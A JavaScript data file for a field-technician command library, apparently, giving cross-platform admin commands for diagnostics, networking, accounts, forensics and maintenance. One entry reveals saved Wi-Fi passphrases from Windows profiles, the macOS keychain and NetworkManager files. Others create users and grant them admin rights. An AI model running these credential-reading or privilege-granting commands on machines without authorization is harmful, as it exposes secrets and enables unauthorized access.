/* FieldKit — command library data.
   Loaded by FieldKit.html via <script src="library-data.js">, which works from
   file:// (a fetched .json would be blocked). Sets window.FIELDKIT_LIBRARY.
   Schema + how to add entries: see CONTRIBUTING.md. */
window.FIELDKIT_LIBRARY = [
/* ---------- SYSTEM INFO ---------- */
{id:"sys-summary", level:"beginner", cat:"System Info", title:"System & hardware summary",
 desc:"OS, model, CPU, and architecture at a glance.",
 code:{
  ps:`Get-CimInstance Win32_OperatingSystem |
  Select-Object CSName, Caption, Version, OSArchitecture, @{n='InstalledRAM_GB';e={[math]::Round($_.TotalVisibleMemorySize/1MB,1)}}
Get-CimInstance Win32_ComputerSystem | Select-Object Manufacturer, Model
Get-CimInstance Win32_Processor  | Select-Object Name, NumberOfCores, NumberOfLogicalProcessors`,
  cmd:`systeminfo | findstr /C:"OS Name" /C:"OS Version" /C:"System Manufacturer" /C:"System Model" /C:"System Type" /C:"Total Physical Memory"`,
  py:`import platform, socket
print("Host      :", socket.gethostname())
print("OS        :", platform.system(), platform.release())
print("Version   :", platform.version())
print("Machine   :", platform.machine())
print("Processor :", platform.processor())`,
  mac:`echo "Host : $(hostname)"
sw_vers
echo "Model: $(sysctl -n hw.model)"
sysctl -n machdep.cpu.brand_string
echo "Cores: $(sysctl -n hw.ncpu)  Arch: $(uname -m)"`,
  linux:`echo "Host : $(hostname)"
uname -a
[ -r /etc/os-release ] && . /etc/os-release && echo "OS   : $PRETTY_NAME"
lscpu | grep -E 'Model name|^CPU\\(s\\)|Architecture'`
 }},
{id:"sys-uptime", level:"beginner", cat:"System Info", title:"Uptime / last boot",
 desc:"How long the machine has been running since last boot.",
 code:{
  ps:`$b=(Get-CimInstance Win32_OperatingSystem).LastBootUpTime
"Last boot : $b"
"Uptime    : {0:dd}d {0:hh}h {0:mm}m" -f ((Get-Date)-$b)`,
  cmd:`net statistics workstation | find "Statistics since"`,
  mac:`uptime
# last boot as a date:
date -r $(sysctl -n kern.boottime | sed -E 's/.*sec = ([0-9]+).*/\\1/')`,
  linux:`uptime -p
echo "Since: $(uptime -s)"`,
  py:`import subprocess, sys
# Standard-lib friendly: read boot time from /proc on Linux
try:
    with open('/proc/uptime') as f:
        secs=float(f.read().split()[0])
    print(f"Uptime: {int(secs//86400)}d {int(secs%86400//3600)}h {int(secs%3600//60)}m")
except FileNotFoundError:
    print("Run on Linux, or use: import psutil; psutil.boot_time()")`
 }},
{id:"sys-serial", level:"beginner",requires:{"elevation":true}, cat:"System Info", title:"Serial number / asset tag",
 desc:"Pull the BIOS serial for asset tracking or warranty lookup.",
 code:{
  ps:`Get-CimInstance Win32_BIOS | Select-Object Manufacturer, SerialNumber, SMBIOSBIOSVersion
Get-CimInstance Win32_ComputerSystemProduct | Select-Object Name, IdentifyingNumber`,
  cmd:`wmic bios get serialnumber
wmic csproduct get name,identifyingnumber`,
  mac:`system_profiler SPHardwareDataType |
  awk -F': ' '/Serial Number|Model Identifier|Hardware UUID/{print $1": "$2}'`,
  linux:`sudo dmidecode -s system-serial-number
sudo dmidecode -s system-product-name`
 }},

/* ---------- NETWORK ---------- */
{id:"net-ipconfig", level:"beginner", cat:"Network", title:"IP configuration (all adapters)",
 desc:"Addresses, gateways, DNS servers, and MACs for every interface.",
 code:{
  ps:`Get-NetIPConfiguration | Format-List InterfaceAlias, IPv4Address, IPv4DefaultGateway, DNSServer
Get-NetAdapter | Select-Object Name, Status, MacAddress, LinkSpeed`,
  cmd:`ipconfig /all`,
  mac:`ifconfig | grep -E '^[a-z]|inet '
echo "-- routes --"; netstat -rn | grep -E '^default'
echo "-- dns --"; scutil --dns | awk '/nameserver/{print $3}' | sort -u`,
  linux:`ip -brief addr
echo "-- routes --"; ip route
echo "-- dns --"; resolvectl status 2>/dev/null | grep 'DNS Server' || cat /etc/resolv.conf`,
  py:`import socket
host=socket.gethostname()
print("Host:", host)
print("Primary IP:", socket.gethostbyname(host))
for res in socket.getaddrinfo(host, None):
    print(res[4][0])`
 }},
{id:"net-public-ip", level:"beginner", cat:"Network", title:"Public / WAN IP address",
 desc:"Ask an external service what IP the internet sees you as.",
 code:{
  ps:`(Invoke-RestMethod -Uri 'https://ifconfig.me/ip').Trim()`,
  cmd:`curl -s https://ifconfig.me`,
  mac:`curl -s https://ifconfig.me; echo`,
  linux:`curl -s https://ifconfig.me; echo`,
  py:`import urllib.request
print(urllib.request.urlopen("https://ifconfig.me/ip", timeout=6).read().decode().strip())`
 }},
{id:"net-ping-sweep", level:"beginner", cat:"Network", title:"Ping sweep a /24 subnet",
 desc:"Find live hosts on a local subnet. Set the base to your network.",
 code:{
  ps:`$base='192.168.1'
1..254 | ForEach-Object {
  if (Test-Connection "$base.$_" -Count 1 -Quiet -TimeoutSeconds 1) { "$base.$_  UP" }
}`,
  cmd:`@echo off
set base=192.168.1
for /L %%i in (1,1,254) do @ping -n 1 -w 200 %base%.%%i | find "TTL=" >nul && echo %base%.%%i UP`,
  mac:`base=192.168.1
for i in $(seq 1 254); do
  ping -c1 -t1 "\${base}.\${i}" >/dev/null 2>&1 && echo "\${base}.\${i} UP" &
done; wait`,
  linux:`base=192.168.1
for i in $(seq 1 254); do
  ping -c1 -W1 "\${base}.\${i}" >/dev/null 2>&1 && echo "\${base}.\${i} UP" &
done; wait`,
  py:`import subprocess, platform, concurrent.futures as cf
base="192.168.1"
flag="-n" if platform.system()=="Windows" else "-c"
def up(i):
    ip=f"{base}.{i}"
    r=subprocess.run(["ping",flag,"1",ip],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
    return ip if r.returncode==0 else None
with cf.ThreadPoolExecutor(max_workers=64) as ex:
    for ip in filter(None, ex.map(up, range(1,255))):
        print(ip, "UP")`
 }},
{id:"net-port-check", level:"beginner", cat:"Network", title:"Check if a TCP port is open",
 desc:"Test reachability of host:port — quick service-up check.",
 code:{
  ps:`Test-NetConnection -ComputerName example.com -Port 443 |
  Select-Object ComputerName, RemotePort, TcpTestSucceeded`,
  mac:`host=example.com; port=443
# BSD nc: -G connect timeout (s)
nc -z -G3 "$host" "$port" && echo OPEN || echo CLOSED`,
  linux:`host=example.com; port=443
timeout 3 bash -c "</dev/tcp/\${host}/\${port}" && echo "OPEN" || echo "CLOSED"`,
  py:`import socket
host, port = "example.com", 443
s=socket.socket(); s.settimeout(3)
print("OPEN" if s.connect_ex((host,port))==0 else "CLOSED")
s.close()`
 }},
{id:"net-listening", level:"beginner",requires:{"elevation":true}, cat:"Network", title:"Listening ports + owning process",
 desc:"What's accepting connections, and which PID owns it.",
 code:{
  ps:`Get-NetTCPConnection -State Listen |
  Select-Object LocalAddress, LocalPort,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess).ProcessName}}, OwningProcess |
  Sort-Object LocalPort`,
  cmd:`netstat -ano | findstr LISTENING`,
  mac:`sudo lsof -nP -iTCP -sTCP:LISTEN`,
  linux:`ss -tulpn 2>/dev/null || sudo ss -tulpn`
 }},
{id:"net-dns", level:"beginner", cat:"Network", title:"DNS lookup",
 desc:"Resolve a hostname to its A/AAAA records.",
 code:{
  ps:`Resolve-DnsName example.com | Select-Object Name, Type, IPAddress`,
  cmd:`nslookup example.com`,
  mac:`dig +short example.com A AAAA || nslookup example.com`,
  linux:`dig +short example.com A AAAA || nslookup example.com`,
  py:`import socket
name="example.com"
for fam,_,_,_,addr in socket.getaddrinfo(name,None):
    print(addr[0])`
 }},
{id:"net-arp", level:"beginner", cat:"Network", title:"ARP / neighbor table",
 desc:"Map local IPs to MAC addresses — spot devices on the LAN.",
 code:{
  ps:`Get-NetNeighbor -AddressFamily IPv4 |
  Where-Object State -in 'Reachable','Stale' |
  Select-Object IPAddress, LinkLayerAddress, State`,
  cmd:`arp -a`,
  mac:`arp -an`,
  linux:`ip neigh show`
 }},
{id:"net-wifi-pw", level:"beginner",requires:{"elevation":true}, cat:"Network", title:"Saved Wi-Fi profiles & keys (Windows)",
 desc:"List stored wireless networks and reveal a saved passphrase.",
 danger:"Only on machines you are authorized to service.",
 code:{
  cmd:`netsh wlan show profiles
:: reveal one profile's key:
netsh wlan show profile name="SSID_HERE" key=clear | findstr "Key Content"`,
  ps:`(netsh wlan show profiles) |
  Select-String ':\\s(.+)$' |
  ForEach-Object {
    $ssid=$_.Matches.Groups[1].Value.Trim()
    $key=(netsh wlan show profile name="$ssid" key=clear |
      Select-String 'Key Content\\s+:\\s(.+)$').Matches.Groups[1].Value
    [pscustomobject]@{SSID=$ssid; Key=$key}
  }`,
  mac:`# reveal a saved Wi-Fi password from the keychain (prompts for admin):
security find-generic-password -wa "SSID_HERE"   # set the SSID`,
  linux:`# NetworkManager stores keys here (root):
sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ 2>/dev/null`
 }},

/* ---------- USERS & ACCESS ---------- */
{id:"usr-list", level:"beginner", cat:"Users & Access", title:"List local user accounts",
 desc:"Enumerate local accounts and whether they're enabled.",
 code:{
  ps:`Get-LocalUser | Select-Object Name, Enabled, LastLogon, Description`,
  cmd:`net user`,
  mac:`# real (non-service) accounts hide the leading-underscore system users:
dscl . -list /Users | grep -v '^_'`,
  linux:`getent passwd | awk -F: '$3>=1000 && $3<65534 {print $1"  (uid "$3")"}'`
 }},
{id:"usr-admins", level:"beginner", cat:"Users & Access", title:"List administrators / sudoers",
 desc:"Who has elevated rights on this box.",
 code:{
  ps:`Get-LocalGroupMember -Group 'Administrators' |
  Select-Object Name, ObjectClass, PrincipalSource`,
  cmd:`net localgroup administrators`,
  mac:`dscl . -read /Groups/admin GroupMembership`,
  linux:`echo "sudo:";  getent group sudo  | cut -d: -f4
echo "wheel:"; getent group wheel | cut -d: -f4`
 }},
{id:"usr-create", level:"beginner",requires:{"elevation":true}, cat:"Users & Access", title:"Create a local user",
 desc:"Add a standard local account. Edit the name before running.",
 danger:"Modifies accounts — run only where authorized.",
 code:{
  ps:`$pw = Read-Host 'New password' -AsSecureString
New-LocalUser -Name 'techuser' -Password $pw -FullName 'Field Tech' -Description 'Service account'`,
  cmd:`net user techuser * /add`,
  mac:`# -password - prompts interactively for the new password:
sudo sysadminctl -addUser techuser -fullName "Field Tech" -password -`,
  linux:`sudo useradd -m -s /bin/bash techuser
sudo passwd techuser`
 }},
{id:"usr-mkadmin", level:"beginner",requires:{"elevation":true}, cat:"Users & Access", title:"Grant admin / sudo to a user",
 desc:"Add an existing account to the admin group.",
 danger:"Privilege change — run only where authorized.",
 code:{
  ps:`Add-LocalGroupMember -Group 'Administrators' -Member 'techuser'`,
  cmd:`net localgroup administrators techuser /add`,
  mac:`sudo dseditgroup -o edit -a techuser -t user admin`,
  linux:`sudo usermod -aG sudo techuser   # Debian/Ubuntu
# sudo usermod -aG wheel techuser  # RHEL/Fedora`
 }},
{id:"usr-loggedon", level:"beginner", cat:"Users & Access", title:"Who is logged on",
 desc:"Current interactive and remote sessions.",
 code:{
  ps:`query user 2>$null
Get-CimInstance Win32_LoggedOnUser | Select-Object -Expand Antecedent -Unique`,
  cmd:`query user`,
  mac:`who
echo "-- active --"; w`,
  linux:`who -u
echo "-- active --"; w`
 }},
{id:"usr-amiadmin", level:"beginner", cat:"Users & Access", title:"Am I admin / root?",
 desc:"Check whether the current shell is elevated before you start.",
 code:{
  ps:`$p=[Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
if ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {'Elevated'} else {'NOT elevated'}`,
  cmd:`net session >nul 2>&1 && echo Elevated || echo NOT elevated`,
  mac:`[ "$(id -u)" -eq 0 ] && echo "root" || echo "not root"`,
  linux:`[ "$(id -u)" -eq 0 ] && echo "root" || echo "not root"`,
  py:`import os, ctypes
try:
    admin = ctypes.windll.shell32.IsUserAnAdmin() != 0   # Windows
except AttributeError:
    admin = (os.geteuid() == 0)                          # POSIX
print("Elevated" if admin else "NOT elevated")`
 }},

/* ---------- DISK & FILES ---------- */
{id:"disk-usage", level:"beginner", cat:"Disk & Files", title:"Disk usage / free space",
 desc:"Capacity and free space per volume.",
 code:{
  ps:`Get-Volume | Where-Object DriveLetter |
  Select-Object DriveLetter, FileSystemLabel,
    @{n='Size_GB';e={[math]::Round($_.Size/1GB,1)}},
    @{n='Free_GB';e={[math]::Round($_.SizeRemaining/1GB,1)}}`,
  cmd:`wmic logicaldisk get caption,volumename,size,freespace`,
  mac:`df -h
echo "-- volumes --"; diskutil list`,
  linux:`df -hT -x tmpfs -x devtmpfs`,
  py:`import shutil, string, os
if os.name=="nt":
    drives=[f"{d}:\\\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\\\")]
else:
    drives=["/"]
for d in drives:
    t,u,f=shutil.disk_usage(d)
    print(f"{d}  size {t//2**30}G  free {f//2**30}G")`
 }},
{id:"disk-large", level:"beginner", cat:"Disk & Files", title:"Find the largest files",
 desc:"Top space hogs under the current folder — cleanup triage.",
 code:{
  ps:`Get-ChildItem -Path . -Recurse -File -ErrorAction SilentlyContinue |
  Sort-Object Length -Descending | Select-Object -First 20 FullName,
    @{n='MB';e={[math]::Round($_.Length/1MB,1)}}`,
  mac:`du -ah . 2>/dev/null | sort -rh | head -20`,
  linux:`du -ah . 2>/dev/null | sort -rh | head -20`,
  py:`import os
files=[]
for root,_,names in os.walk("."):
    for n in names:
        p=os.path.join(root,n)
        try: files.append((os.path.getsize(p),p))
        except OSError: pass
for size,p in sorted(files,reverse=True)[:20]:
    print(f"{size/1048576:8.1f} MB  {p}")`
 }},
{id:"disk-findext", level:"beginner", cat:"Disk & Files", title:"Find files by extension",
 desc:"Recursively locate all files of a given type.",
 code:{
  ps:`Get-ChildItem -Path . -Recurse -Filter *.log -File |
  Select-Object FullName, LastWriteTime, Length`,
  cmd:`dir /s /b *.log`,
  mac:`# -printf is GNU-only; use BSD stat for the mtime:
find . -type f -name '*.log' -exec stat -f '%Sm  %N' {} +`,
  linux:`find . -type f -name '*.log' -printf '%TY-%Tm-%Td  %p\\n'`,
  py:`from pathlib import Path
for p in Path(".").rglob("*.log"):
    print(p)`
 }},
{id:"disk-hash", level:"beginner", cat:"Disk & Files", title:"Hash a file (SHA-256)",
 desc:"Verify integrity or match a known-good/known-bad hash.",
 code:{
  ps:`Get-FileHash -Path .\\file.bin -Algorithm SHA256 | Select-Object Hash, Path`,
  cmd:`certutil -hashfile file.bin SHA256`,
  mac:`shasum -a 256 file.bin`,
  linux:`sha256sum file.bin`,
  py:`import hashlib
h=hashlib.sha256()
with open("file.bin","rb") as f:
    for chunk in iter(lambda: f.read(1<<20), b""):
        h.update(chunk)
print(h.hexdigest())`
 }},

/* ---------- PROCESSES & SERVICES ---------- */
{id:"proc-top", level:"beginner", cat:"Processes & Services", title:"Top processes by CPU / memory",
 desc:"See what's actually eating the machine right now.",
 code:{
  ps:`Get-Process | Sort-Object CPU -Descending |
  Select-Object -First 15 Name, Id,
    @{n='CPU_s';e={[math]::Round($_.CPU,1)}},
    @{n='RAM_MB';e={[math]::Round($_.WorkingSet64/1MB,1)}}`,
  cmd:`tasklist /v /fo table | more`,
  mac:`ps aux -r | head -16   # BSD ps: -r sorts by CPU`,
  linux:`ps aux --sort=-%cpu | head -16`
 }},
{id:"proc-kill", level:"beginner", cat:"Processes & Services", title:"Kill a process by name",
 desc:"Force-stop a hung application.",
 danger:"Force-terminates processes — unsaved data may be lost.",
 code:{
  ps:`Stop-Process -Name 'notepad' -Force`,
  cmd:`taskkill /IM notepad.exe /F`,
  mac:`pkill -f notepad`,
  linux:`pkill -f notepad`
 }},
{id:"proc-services", level:"beginner", cat:"Processes & Services", title:"Running services",
 desc:"List services currently in the running state.",
 code:{
  ps:`Get-Service | Where-Object Status -eq 'Running' |
  Select-Object Status, Name, DisplayName | Sort-Object DisplayName`,
  cmd:`net start`,
  mac:`launchctl list`,
  linux:`systemctl list-units --type=service --state=running --no-pager`
 }},
{id:"proc-restart-svc", level:"beginner",requires:{"elevation":true}, cat:"Processes & Services", title:"Restart a service",
 desc:"Bounce a service (example: the print spooler).",
 code:{
  ps:`Restart-Service -Name 'Spooler' -Force
Get-Service Spooler | Select-Object Status, Name`,
  cmd:`net stop Spooler && net start Spooler`,
  mac:`# bounce a launchd service (example: CUPS printing):
sudo launchctl kickstart -k system/org.cups.cupsd`,
  linux:`sudo systemctl restart cups
systemctl is-active cups`
 }},
{id:"proc-startup", level:"beginner", cat:"Processes & Services", title:"Startup / autorun items",
 desc:"What launches at boot or logon — a common malware hiding spot.",
 code:{
  ps:`Get-CimInstance Win32_StartupCommand |
  Select-Object Name, Command, Location, User`,
  cmd:`wmic startup get caption,command,location`,
  mac:`launchctl list
echo "-- launch agents / daemons --"
ls -1 ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons 2>/dev/null`,
  linux:`systemctl list-unit-files --state=enabled --no-pager
ls -la ~/.config/autostart/ 2>/dev/null`
 }},

/* ---------- FORENSICS ---------- */
{id:"for-recent", level:"intermediate", cat:"Forensics", title:"Recently modified files (last 24h)",
 desc:"Surface files touched in the last day — activity triage.",
 example_output:`Modified     Size     File
--------     ----     ----
6 min ago    14 KB    .\\report.md
2.3 hr ago   1.2 MB   .\\data\\export.csv
9.1 hr ago   823 B    .\\notes.txt`,
 code:{
  ps:`Get-ChildItem -Recurse -File -ErrorAction SilentlyContinue |
  Where-Object LastWriteTime -gt (Get-Date).AddDays(-1) |
  Sort-Object LastWriteTime -Descending |
  ForEach-Object {
    $mins = [int]((Get-Date) - $_.LastWriteTime).TotalMinutes
    if ($mins -lt 60) { $when = "$mins min ago" } else { $when = "{0:N1} hr ago" -f ($mins / 60) }
    if     ($_.Length -ge 1MB) { $size = "{0:N1} MB" -f ($_.Length / 1MB) }
    elseif ($_.Length -ge 1KB) { $size = "{0:N0} KB" -f ($_.Length / 1KB) }
    else                       { $size = "$($_.Length) B" }
    [pscustomobject]@{ Modified = $when; Size = $size; File = Resolve-Path -Relative $_.FullName }
  } | Format-Table -AutoSize`,
  mac:`find . -type f -mtime -1 -exec stat -f '%Sm  %N' {} + 2>/dev/null | sort`,
  linux:`find . -type f -mtime -1 -printf '%TY-%Tm-%Td %TH:%TM  %p\\n' 2>/dev/null | sort`,
  py:`import os, time
cut=time.time()-86400
for root,_,names in os.walk("."):
    for n in names:
        p=os.path.join(root,n)
        try:
            m=os.path.getmtime(p)
            if m>cut: print(time.strftime('%Y-%m-%d %H:%M',time.localtime(m)),p)
        except OSError: pass`
 }},
{id:"for-logons", level:"intermediate",requires:{"elevation":true}, cat:"Forensics", title:"Recent successful logons (Event 4624)",
 desc:"Pull the last logon events from the Security log.",
 danger:"Requires administrator / SeSecurityPrivilege.",
 code:{
  ps:`Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 25 |
  Select-Object TimeCreated,
    @{n='User';e={$_.Properties[5].Value}},
    @{n='LogonType';e={$_.Properties[8].Value}},
    @{n='Source';e={$_.Properties[18].Value}}`,
  cmd:`wevtutil qe Security /q:"*[System[(EventID=4624)]]" /c:25 /rd:true /f:text`
 }},
{id:"for-usb", level:"intermediate", cat:"Forensics", title:"USB storage device history (Windows)",
 desc:"Devices that have been connected, from the registry.",
 code:{
  ps:`Get-ChildItem 'HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR' |
  ForEach-Object { $_.PSChildName }`,
  cmd:`reg query HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR`
 }},
{id:"for-prefetch", level:"intermediate", cat:"Forensics", title:"Prefetch listing (execution evidence)",
 desc:"List .pf files with timestamps — evidence of program execution.",
 code:{
  ps:`Get-ChildItem 'C:\\Windows\\Prefetch\\*.pf' -ErrorAction SilentlyContinue |
  Select-Object Name, LastWriteTime, Length | Sort-Object LastWriteTime -Descending`,
  cmd:`dir /o-d C:\\Windows\\Prefetch\\*.pf`
 }},
{id:"for-hashdir", level:"intermediate", cat:"Forensics", title:"Hash every file in a folder → CSV",
 desc:"Build an integrity manifest for a directory of evidence.",
 code:{
  ps:`Get-ChildItem -Path . -Recurse -File |
  Get-FileHash -Algorithm SHA256 |
  Select-Object Hash, Path |
  Export-Csv -Path .\\hashes.csv -NoTypeInformation
"Wrote hashes.csv"`,
  mac:`find . -type f -exec shasum -a 256 {} + > hashes.txt
echo "Wrote hashes.txt (\$(wc -l < hashes.txt | tr -d ' ') files)"`,
  linux:`find . -type f -exec sha256sum {} \\; > hashes.txt
echo "Wrote hashes.txt (\$(wc -l < hashes.txt) files)"`,
  py:`import hashlib, csv, os
with open("hashes.csv","w",newline="") as out:
    w=csv.writer(out); w.writerow(["sha256","path"])
    for root,_,names in os.walk("."):
        for n in names:
            p=os.path.join(root,n)
            h=hashlib.sha256()
            try:
                with open(p,"rb") as f:
                    for c in iter(lambda: f.read(1<<20), b""): h.update(c)
                w.writerow([h.hexdigest(),p])
            except OSError: pass
print("Wrote hashes.csv")`
 }},
{id:"for-installed", level:"intermediate", cat:"Forensics", title:"Installed programs list",
 desc:"Enumerate installed software from the uninstall registry keys.",
 code:{
  ps:`$paths='HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*',
        'HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'
Get-ItemProperty $paths -ErrorAction SilentlyContinue |
  Where-Object DisplayName |
  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
  Sort-Object DisplayName`,
  cmd:`reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s /f DisplayName`
 }},

/* ---------- SECURITY ---------- */
{id:"sec-firewall", level:"intermediate",requires:{"elevation":true}, cat:"Security", title:"Firewall status",
 desc:"Are the firewall profiles on, and what's the default action.",
 code:{
  ps:`Get-NetFirewallProfile |
  Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction`,
  cmd:`netsh advfirewall show allprofiles state`,
  mac:`# application firewall + packet filter:
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
sudo pfctl -s info 2>/dev/null`,
  linux:`sudo ufw status verbose 2>/dev/null || sudo iptables -L -n -v`
 }},
{id:"sec-defender", level:"intermediate", cat:"Security", title:"Windows Defender status",
 desc:"Real-time protection, signature age, and last scan.",
 code:{
  ps:`Get-MpComputerStatus |
  Select-Object AMRunningMode, RealTimeProtectionEnabled,
    AntivirusSignatureLastUpdated, QuickScanEndTime, AntispywareEnabled`
 }},
{id:"sec-hotfix", level:"intermediate", cat:"Security", title:"Installed updates / hotfixes",
 desc:"Patch level and most recent updates applied.",
 code:{
  ps:`Get-HotFix | Sort-Object InstalledOn -Descending |
  Select-Object -First 20 HotFixID, Description, InstalledOn`,
  cmd:`wmic qfe list brief /format:table`,
  mac:`# OS update history (falls back to full install history):
softwareupdate --history 2>/dev/null || system_profiler SPInstallHistoryDataType`,
  linux:`# Debian/Ubuntu recent package changes:
grep " install \\| upgrade " /var/log/dpkg.log 2>/dev/null | tail -20`
 }},

/* ---------- MAINTENANCE ---------- */
{id:"mnt-temp", level:"beginner", cat:"Maintenance", title:"Clear temp files",
 desc:"Wipe the current user's temp folder to reclaim space.",
 danger:"Deletes files — closes nothing gracefully. Skips locked files.",
 code:{
  ps:`Remove-Item "$env:TEMP\\*" -Recurse -Force -ErrorAction SilentlyContinue
"Cleared $env:TEMP"`,
  cmd:`del /q /f /s "%TEMP%\\*" >nul 2>&1
echo Cleared %TEMP%`,
  mac:`rm -rf "\${TMPDIR:-/tmp}"/* 2>/dev/null; echo "Cleared \${TMPDIR:-/tmp}"`,
  linux:`rm -rf "\${TMPDIR:-/tmp}"/* 2>/dev/null; echo "Cleared \${TMPDIR:-/tmp}"`
 }},
{id:"mnt-flushdns", level:"beginner",requires:{"elevation":true}, cat:"Maintenance", title:"Flush DNS cache",
 desc:"Clear the resolver cache after a DNS change.",
 code:{
  ps:`Clear-DnsClientCache; "DNS cache flushed"`,
  cmd:`ipconfig /flushdns`,
  mac:`sudo dscacheutil -flushcache; sudo killall -HUP mDNSResponder; echo "DNS cache flushed"`,
  linux:`sudo resolvectl flush-caches 2>/dev/null || sudo systemd-resolve --flush-caches`
 }},
{id:"mnt-sfc", level:"beginner",requires:{"elevation":true}, cat:"Maintenance", title:"Repair system files (SFC + DISM)",
 desc:"Standard Windows corruption repair sequence.",
 danger:"Long-running; run in an elevated prompt.",
 code:{
  cmd:`DISM /Online /Cleanup-Image /RestoreHealth
sfc /scannow`,
  ps:`Repair-WindowsImage -Online -RestoreHealth
sfc /scannow`
 }},
{id:"mnt-recycle", level:"beginner", cat:"Maintenance", title:"Empty the Recycle Bin",
 desc:"Clear the recycle bin across all drives.",
 danger:"Permanently deletes recycled files.",
 code:{
  ps:`Clear-RecycleBin -Force -ErrorAction SilentlyContinue; "Recycle Bin emptied"`,
  cmd:`rd /s /q C:\\$Recycle.Bin 2>nul & echo Done`
 }},

/* ==================================================================
   ADDED — common tasks for network / account / security admins,
   repair techs, and everyday users.
   ================================================================== */

/* ---------- SYSTEM INFO (added) ---------- */
{id:"sys-env", level:"beginner", cat:"System Info", title:"Environment variables / PATH",
 desc:"Dump environment variables and expand PATH one entry per line.",
 code:{
  ps:`Get-ChildItem Env: | Sort-Object Name
"-- PATH --"; $env:Path -split ';'`,
  cmd:`set
echo.& echo -- PATH --
echo %PATH%`,
  mac:`printenv | sort
echo "-- PATH --"; echo "$PATH" | tr ':' '\\n'`,
  linux:`printenv | sort
echo "-- PATH --"; echo "$PATH" | tr ':' '\\n'`,
  py:`import os
for k in sorted(os.environ): print(f"{k}={os.environ[k]}")
print("-- PATH --")
print(*os.environ.get("PATH","").split(os.pathsep), sep="\\n")`
 }},
{id:"sys-memory", level:"beginner", cat:"System Info", title:"Memory usage (used / free)",
 desc:"Physical RAM total, used, and available right now.",
 code:{
  ps:`$os=Get-CimInstance Win32_OperatingSystem
[pscustomobject]@{
  Total_GB=[math]::Round($os.TotalVisibleMemorySize/1MB,1)
  Free_GB =[math]::Round($os.FreePhysicalMemory/1MB,1)
  Used_GB =[math]::Round(($os.TotalVisibleMemorySize-$os.FreePhysicalMemory)/1MB,1)
}`,
  cmd:`systeminfo | findstr /C:"Total Physical Memory" /C:"Available Physical Memory"`,
  mac:`top -l 1 | grep -E "PhysMem"
vm_stat`,
  linux:`free -h`
 }},
{id:"sys-battery", level:"beginner", cat:"System Info", title:"Battery status & health",
 desc:"Charge level and, where available, battery health/condition.",
 code:{
  ps:`Get-CimInstance Win32_Battery | Select-Object EstimatedChargeRemaining, BatteryStatus
# full HTML health report:
powercfg /batteryreport /output "$env:USERPROFILE\\battery-report.html"`,
  cmd:`powercfg /batteryreport /output "%USERPROFILE%\\battery-report.html"`,
  mac:`pmset -g batt
system_profiler SPPowerDataType | grep -iE -A2 "condition|cycle count|maximum capacity"`,
  linux:`# sysfs, no deps:
cat /sys/class/power_supply/BAT*/capacity /sys/class/power_supply/BAT*/status 2>/dev/null
# richer detail if installed: upower -i $(upower -e | grep BAT)`
 }},
{id:"sys-time", level:"beginner",requires:{"elevation":true}, cat:"System Info", title:"Date, time & clock sync",
 desc:"Current time, timezone, and whether the clock is syncing to NTP.",
 code:{
  ps:`Get-Date
Get-TimeZone | Select-Object Id, DisplayName
w32tm /query /status`,
  cmd:`echo %DATE% %TIME%
w32tm /query /status`,
  mac:`date "+%Y-%m-%d %H:%M:%S %Z"
sudo systemsetup -getnetworktimeserver 2>/dev/null
sudo systemsetup -getusingnetworktime 2>/dev/null`,
  linux:`timedatectl`
 }},
{id:"sys-drivers", level:"beginner", cat:"System Info", title:"Drivers & hardware devices",
 desc:"Enumerate device drivers / kernel modules and attached hardware.",
 code:{
  ps:`Get-CimInstance Win32_PnPSignedDriver |
  Select-Object DeviceName, DriverVersion, Manufacturer, DriverDate |
  Sort-Object DeviceName`,
  cmd:`driverquery /v /fo table`,
  mac:`system_profiler SPPCIDataType SPUSBDataType
# third-party kernel extensions:
kextstat 2>/dev/null | grep -v com.apple`,
  linux:`# needs pciutils / usbutils for lspci / lsusb:
lspci -k 2>/dev/null; echo "-- usb --"; lsusb 2>/dev/null
echo "-- loaded modules --"; lsmod`
 }},
{id:"sys-display", level:"beginner", cat:"System Info", title:"GPU & display info",
 desc:"Graphics adapter, driver, and connected monitors / resolution.",
 code:{
  ps:`Get-CimInstance Win32_VideoController |
  Select-Object Name, DriverVersion,
    CurrentHorizontalResolution, CurrentVerticalResolution, CurrentRefreshRate`,
  cmd:`wmic path win32_VideoController get name,driverversion,videomodedescription
:: wmic is deprecated; prefer PowerShell Get-CimInstance Win32_VideoController`,
  mac:`system_profiler SPDisplaysDataType`,
  linux:`lspci 2>/dev/null | grep -Ei 'vga|3d|display'
xrandr --query 2>/dev/null | grep ' connected'`
 }},

/* ---------- NETWORK (added) ---------- */
{id:"net-traceroute", level:"beginner", cat:"Network", title:"Trace route to a host",
 desc:"Show the L3 hops between you and a destination.",
 code:{
  ps:`Test-NetConnection example.com -TraceRoute |
  Select-Object -ExpandProperty TraceRoute`,
  cmd:`tracert example.com`,
  mac:`traceroute example.com`,
  linux:`traceroute example.com || tracepath example.com   # traceroute may need install`
 }},
{id:"net-dhcp-renew", level:"beginner",requires:{"elevation":true}, cat:"Network", title:"Release & renew DHCP lease",
 desc:"Force a new DHCP address — first step after IP/gateway trouble.",
 danger:"Drops connectivity for a moment; over SSH/RDP you may lose the session.",
 code:{
  ps:`ipconfig /release
ipconfig /renew`,
  cmd:`ipconfig /release
ipconfig /renew`,
  mac:`# set your interface (en0 Wi-Fi, en0/en1 Ethernet):
sudo ipconfig set en0 DHCP`,
  linux:`sudo dhclient -r && sudo dhclient        # or: sudo networkctl renew eth0`
 }},
{id:"net-routes", level:"beginner", cat:"Network", title:"Routing table",
